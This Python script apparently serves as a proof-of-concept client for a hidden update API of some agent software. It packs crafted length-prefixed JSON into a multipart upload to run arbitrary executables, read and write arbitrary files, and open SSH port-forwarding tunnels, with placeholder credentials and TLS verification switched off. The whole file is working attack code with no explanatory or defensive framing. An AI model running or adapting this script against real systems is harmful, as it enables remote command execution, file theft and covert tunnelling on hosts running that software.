import requests
import urllib3
from urllib3.exceptions import InsecureRequestWarning
import io
import json
import struct

urllib3.disable_warnings(InsecureRequestWarning)

url = "https://127.0.0.1:9090/api/v3/update"
username = "user"
password = "password"

payload = {
    "type": "review",  # Available commands: review, download, upload, pf
    "syncresult": True
}
payload_json = json.dumps(payload).encode()

command_payloads = {
    "review": {"dir": "C:\\Windows\\System32\\", "file": "ping.exe", "timeout": 200, "args": ["8.8.8.8"], "envs": {}},
    "download": {"path": "C:\\Windows\\System32\\calc.exe"},
    "upload": {"path": "C:\\Users\\User\\Desktop\\proof.txt"},
    "pf": {"serverAddr": "10.0.0.1:22", "direction": "L", "userName": "user", "password": "password", "localAddr": "127.0.0.1:9091", "remoteAddr": "127.0.0.1:9092"},
    "server": {},
    "storage": {"type": "list", "args": {"id": "f17d9380-5693-11ef-b418-000c29fbee52"}}
}

# Create the Basic Auth header manually because it's not RFC compliant (should be base64-encoded)
auth_value = f"{username}:{password}"
headers = {
    "Authorization": f"Basic {auth_value}"
}


if payload["type"] == "upload":
    response = requests.post(
        url,
        files={"resume": io.BytesIO(b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJ" +
                                    struct.pack('!I', len(payload_json)) +
                                    payload_json +
                                    struct.pack('!I', len(json.dumps(command_payloads["upload"]).encode())) +
                                    json.dumps(command_payloads["upload"]).encode() +
                                    b"Put this in the created file!")},
        headers=headers,
        verify=False
    )
else:
    response = requests.post(
        url,
        files={"resume": io.BytesIO(b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJ" +
                                    struct.pack('!I', len(payload_json)) +
                                    payload_json +
                                    json.dumps(command_payloads[payload["type"]]).encode())},
        headers=headers,
        verify=False
    )

    if len(response.content):
        size = struct.unpack('!I', response.content[:4])[0]
        api_result = json.loads(response.content[4:size + 4])
        print(json.dumps(api_result, indent=4))
        if payload["type"] == "download":
            size_2 = struct.unpack('!I', response.content[size + 4: size + 8])[0]
            command_result = json.loads(response.content[size + 8:size + 8 + size_2])
            print(json.dumps(command_result, indent=4))
            file_data = response.content[size + 8 + size_2:]
            print(file_data)
        else:
            command_result = json.loads(response.content[size + 4:])
            print(json.dumps(command_result, indent=4))
    else:
        print("No response from the API.")
